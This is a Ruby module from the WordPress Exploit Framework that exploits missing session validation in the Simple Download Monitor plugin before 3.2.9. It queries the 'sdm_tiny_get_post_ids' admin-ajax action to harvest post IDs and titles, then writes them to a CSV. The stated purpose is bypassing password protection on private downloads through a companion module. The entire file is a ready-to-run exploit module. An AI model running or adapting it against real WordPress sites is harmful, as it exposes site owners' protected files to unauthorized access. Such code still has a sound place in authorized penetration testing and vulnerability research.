# frozen_string_literal: true

class Wpxf::Auxiliary::SimpleDownloadMonitorFileDisclosure < Wpxf::Module
  include Wpxf::WordPress::FileDownload

  def initialize
    super

    update_info(
      name: 'Simple Download Monitor File Disclosure',
      desc: %(
        This module uses a lack of session validation to get a list
        of post IDs and their titles to be used with the
        auxiliary/file_download/simple_download_monitor_file_download
        module in order to bypass the password protection on private downloads.
      ),
      author: [
        'James Golovich', # Disclosure
        'rastating'       # WPXF module
      ],
      references: [
        ['WPVDB', '8364'],
        ['URL', 'http://www.pritect.net/blog/simple-download-monitor-3-2-8-security-vulnerability']
      ],
      date: 'Jan 19 2016'
    )
  end

  def check
    check_plugin_version_from_readme('simple-download-monitor', '3.2.9')
  end

  def register_remote_file_option?
    false
  end

  def downloader_url
    wordpress_url_admin_ajax
  end

  def download_request_params
    { 'action' => 'sdm_tiny_get_post_ids' }
  end

  def file_extension
    '.csv'
  end

  def validate_content(content)
    data = parse_content_into_table_rows(content)
    return false if data.nil?

    emit_table data

    File.open(downloaded_filename, 'w') do |file|
      data.each { |r| file.puts "#{r[:post_id]},#{r[:title]}" }
    end
  end

  def parse_content_into_table_rows(content)
    table_rows = [{
      post_id: 'Post ID', title: 'Title'
    }]

    begin
      json = JSON.parse(content)
      if json['test'] != ''
        json['test'].each do |post|
          table_rows.push(post_id: post['post_id'], title: post['post_title'])
        end
      end
    rescue JSON::ParserError
      emit_error 'Could not parse the response'
      return nil
    end

    table_rows
  end
end
